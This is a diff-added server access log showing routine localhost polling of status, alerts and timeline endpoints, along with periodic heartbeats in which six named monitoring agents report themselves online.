+INFO:     127.0.0.1:65426 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:02:43] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:51715 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:43] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:51716 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:44] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:51717 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:44] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:51718 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:44] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:51719 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:44] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:51720 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+[2026-03-06 13:02:55] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:51729 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /alerts HTTP/1.1" 200 OK
+[2026-03-06 13:02:56] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:51730 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:56] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:51731 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:56] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:51732 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:56] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:51733 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:02:56] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:51734 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:03:07] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:51743 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /alerts HTTP/1.1" 200 OK
+[2026-03-06 13:03:08] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:51744 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:08] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:51745 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:08] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:51746 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:08] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:51747 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:08] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:51748 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65426 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /timeline HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /timeline HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58749 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51701 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58749 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51701 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:03:19] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:51831 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51701 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58749 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58749 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:03:20] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:51832 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:20] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:51833 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:20] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:51834 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:20] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:51835 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:20] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:51836 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58749 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58749 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58749 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58749 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51701 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58749 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64540 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64540 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58749 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58749 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58749 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64540 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64540 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:03:31] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:51843 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:32] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:51844 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:32] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:51845 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:32] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:51846 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:32] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:51847 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:32] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:51848 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64540 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64540 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64540 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64540 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:03:43] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:51856 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:44] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:51857 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:44] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:51858 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:44] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:51859 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:44] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:51860 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:44] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:51861 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64540 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64540 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64540 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:65399 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64540 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64540 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64540 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:03:55] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:51868 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:03:56] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:51869 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /timeline HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /timeline HTTP/1.1" 200 OK
+[2026-03-06 13:03:56] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:51870 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:56] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:51871 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:56] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:51872 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:03:56] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:51873 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /timeline HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /timeline HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49862 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49837 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /alerts HTTP/1.1" 200 OK
+[2026-03-06 13:04:07] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:62671 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:08] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:62672 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:08] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:62673 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:08] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:62674 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:08] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:62675 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:08] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:62676 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49837 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49837 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49862 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:04:20] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:50174 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60681 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:04:20] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:50175 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:20] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:50176 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:20] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:50177 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:20] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:50178 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:20] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:50179 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60681 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60681 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60832 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60832 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:04:32] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:50186 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60832 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:04:32] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:50187 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:32] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:50188 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:32] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:50189 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:32] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:50190 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:33] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:50191 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60832 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60832 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60832 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:04:44] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:50198 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54145 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:04:44] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:50199 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:44] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:50200 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:44] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:50201 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:44] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:50202 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:45] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:50203 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54145 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54145 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54145 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54145 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54145 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:04:56] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:50210 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62664 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51825 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54145 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50167 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:04:56] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:50211 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:56] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:50212 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:57] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:50213 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:57] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:50214 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:04:57] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:50215 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:08] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:50223 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:09] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:50224 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:09] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:50225 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:09] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:50226 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:09] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:50227 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:09] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:50228 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59450 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52601 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59450 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56994 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52601 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59450 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56994 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52601 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56994 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52601 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52601 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:05:20] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:55932 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52601 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56994 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59450 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:05:21] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:55933 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:21] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:55934 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:21] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:55935 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:21] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:55936 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:21] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:55937 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59450 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59450 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56994 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52601 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52601 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56994 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59450 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52601 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:05:32] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:55950 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:33] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:55951 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:33] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:55952 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:33] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:55953 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:33] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:55954 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:33] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:55955 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:44] AgentHealth -> adaptive_agent Online
